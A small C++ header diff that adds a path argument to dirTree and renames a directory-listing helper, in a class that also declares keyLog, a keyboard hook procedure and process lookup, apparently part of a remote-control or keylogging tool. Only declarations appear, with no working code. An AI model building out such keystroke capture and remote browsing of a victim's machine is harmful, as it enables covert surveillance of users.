@@ -35,12 +35,12 @@ public:
 
     Response keyLog();
 
-    Response dirTree(); 
+    Response dirTree(const char* pathName); 
 
     Response disconnect();
 };
 
 DWORD GetProcessIdByName(const char* processName);
-string printDirectoryTree(const char* path, int indent);
+string listDirectoryTree(const char* path, int indent);
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
